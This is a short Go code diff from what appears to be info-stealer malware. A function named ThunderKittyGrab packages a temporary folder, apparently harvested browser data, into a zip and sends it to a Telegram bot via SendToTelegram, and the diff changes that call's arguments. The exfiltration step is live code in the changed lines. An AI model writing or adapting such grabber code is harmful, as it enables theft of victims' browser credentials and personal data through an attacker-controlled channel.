@@ -371,7 +371,7 @@ func ThunderKittyGrab(botToken, chatID string) {
 
 	description := fmt.Sprintf("```%s```", Tree(tempDir, ""))
 
-	if err := requests.SendToTelegram(botToken, chatID, "Browsers", description, tempZip); err != nil {
+	if err := requests.SendToTelegram(botToken, chatID, description, tempZip); err != nil {
 		fmt.Println("Failed to send data to Telegram:", err)
 		return
 	}
